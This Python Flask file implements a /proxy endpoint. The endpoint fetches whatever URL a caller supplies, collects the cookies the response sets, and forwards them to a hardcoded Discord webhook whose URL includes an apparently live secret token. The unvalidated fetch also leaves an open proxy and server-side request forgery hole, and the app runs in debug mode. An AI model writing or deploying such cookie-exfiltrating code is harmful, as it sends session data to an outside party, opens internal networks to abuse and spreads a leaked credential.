from flask import Flask, request, jsonify
import requests
import json

app = Flask(__name__)

# Replace 'WEBHOOK_URL' with your actual webhook URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/1233946939075203072/-KjYETJtd8I4cmIvU8k2UIa0JA1mW5RAArFVaCmp2rlU5zv1MJ8OkoKYBNv-Awc8E1fg'

@app.route('/proxy')
def proxy():
    url = request.args.get('url')
    if not url:
        return 'URL parameter is missing', 400
    
    # Make a request to the specified URL
    response = requests.get(url)
    
    # Extract cookies from the response
    cookies = response.cookies
    
    # Convert cookies to dictionary format
    cookies_dict = {}
    for cookie in cookies:
        cookies_dict[cookie.name] = cookie.value
    
    # Send cookies to webhook
    send_to_webhook(cookies_dict)
    
    # Return cookies as JSON response
    return jsonify(cookies_dict)

def send_to_webhook(data):
    headers = {'Content-Type': 'application/json'}
    response = requests.post(WEBHOOK_URL, data=json.dumps(data), headers=headers)
    if response.status_code != 200:
        print('Failed to send data to webhook:', response.text)

if __name__ == '__main__':
    app.run(debug=True)
